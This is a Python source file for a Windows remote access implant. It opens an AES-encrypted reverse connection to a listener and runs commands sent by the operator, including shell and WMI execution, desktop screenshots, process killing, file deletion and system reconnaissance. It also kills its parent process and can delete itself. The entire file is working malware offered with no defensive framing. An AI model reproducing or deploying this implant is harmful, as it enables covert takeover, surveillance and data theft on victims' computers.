import os, sys, subprocess, socket, hashlib, base64, win32api, win32file, wmi
from Crypto import Random
from Crypto.Cipher import AES

# Variables for connection and results
lhost = "127.0.0.1"
lport = 443
# This is the key for the AES encryption, can be modified
CIPHER = "32_rFE2Z@M4KSJYy6w2KgzH9fCYfD=&bPj?e"

# Variables for function calls
result = ''
wmi = wmi.WMI()

class AESCipher(object):
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf-8'))
        if isinstance(data, u_type):
            return data.encode('utf-8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

# establish cipher
cipher = AESCipher(key=CIPHER)

# Build socket connection to server
def client():
  global result
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((lhost, lport))
  while True:
    command = s.recv(2048)
    decrypted = cipher.decrypt(command)
    runCommand(decrypted)
    encrypted = cipher.encrypt(result)
    s.send(encrypted)

# Kill Parent process
def killParent():
  p = win32api.GetCurrentProcessId()
  for prc in wmi.Win32_Process(ProcessId=p):
    ppid = prc.ParentProcessId
  h = win32api.OpenProcess(1, False, ppid)
  win32api.TerminateProcess(h, 0)
  h.Close()

# Screenshot function
def screenshot(command):
  global result
  try:
    import win32gui
    import win32ui
    import win32con   
    hdesktop = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN) 
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshot.SaveBitmapFile(mem_dc, command)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    result = 'Success\n'
  except:
    result = 'Failed\n'

# Download file from target
#def download(command):

# Upload file to target

# Shell functionality
def shell(command):
  prochandle = subprocess.Popen(command,  shell=False,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  return prochandle.stdout.read() + prochandle.stderr.read()

# run commands
def runCommand(command):
  global result
  result = ''

  # Change current directory
  if command.lower().startswith('cd'):
    params = command.split()
    win32file.SetCurrentDirectory(str(params[1]))
    result = '%s\n' % (os.getcwd())

  # Copy specified file
  elif command.lower().startswith('cp'):
    params = command.split()
    try:
      win32api.CopyFile(str(params[1]), str(params[2]), False)
      result = 'Success\n'
    except:
      result = 'Failed\n'

  # Download file from target
  #elif command.lower().startswith('download'):
   #params = command.split()
    #download(params[1])

  # Get process ID
  elif command.lower().startswith('getpid'):
    result = '%s\n' % (win32api.GetCurrentProcessId()) 

  # Get current user
  elif command.lower().startswith('getuid'):
    result = '%s\n' % (win32api.GetUserName())

  # Get hostname
  elif command.lower().startswith('hostname'):
    result = '%s\n' % (win32api.GetComputerName())

  # Kill specified process
  elif command.lower().startswith('kill'):
    params = command.split()
    try:
      h = win32api.OpenProcess(1, False, int(params[1]))
      try:
        win32api.TerminateProcess(h, 0)
        result = 'Success\n'
      except:
        result = 'Failed\n'
      h.Close()
    except:
      result = 'Failed\n'

  # List current directory
  elif command.lower().startswith('ls'):
    list = os.listdir(os.getcwd())
    for i in list:
      result += '%s\n' % (i)

  # Get process list
  elif command.lower().startswith('ps'):
    result = 'ProcessID	ParentID		Name\n'
    for p in wmi.Win32_Process():
      result += '%s		%s		%s\n' % (p.ProcessId, p.ParentProcessId, p.Name)

  # Purge implant from system
  elif command.lower().startswith('purge'):
    p = win32api.GetCurrentProcessId()
    for prc in wmi.Win32_Process(ProcessId=p):
      path = prc.ExecutablePath
    h = win32api.OpenProcess(1, False, p)
    comd = "cmd.exe /Q /c DEL %s" % (path)
    wmi.Win32_Process.Create(comd)
    win32api.TerminateProcess(h, 0)

  # Get present working directory
  elif command.lower().startswith('pwd'):
    result = '%s\n' % (os.getcwd())

  # Remove specified file
  elif command.lower().startswith('rm'):
    params = command.split()
    try:
      win32file.DeleteFile(str(params[1]))
      result = 'Success\n'
    except:
      result = 'Failed\n'

  # Take screenshot of user's desktop
  elif command.lower().startswith('screenshot'):
   params = command.split()
   screenshot(params[1])

  # Execute shell command
  elif command.lower().startswith('shell'):
    params = command.split()
    result = shell(params[1:])

  # Sysinfo macro
  elif command.lower().startswith('sysinfo'):
    result += 'User: %s\n' % (win32api.GetUserName())
    result += 'Host: %s\n' % (win32api.GetComputerName())
    for operating in wmi.Win32_OperatingSystem():
      result += 'OS: %s\n' % (operating.caption)
    try:
      os.environ["PROGRAMFILES(X86)"]
      result += 'Arch: x64\n'
    except:
      result += 'Arch: x86\n'
    result += 'Domain: %s\n' % (win32api.GetDomainName())

  # Upload file to target
  #elif command.lower().startswith('upload'):

  # Execute command via WMI
  elif command.lower().startswith('wmi'):
    params = command.split()
    try:
      wmi.Win32_Process.Create(str(params[1]))
      result = 'Success\n'
    except:
      result = 'Failed\n'

  # Else just pass and don't execute anything
  else:
    pass

# Build main function
if __name__ == '__main__':
  while True:
    killParent()
    client()
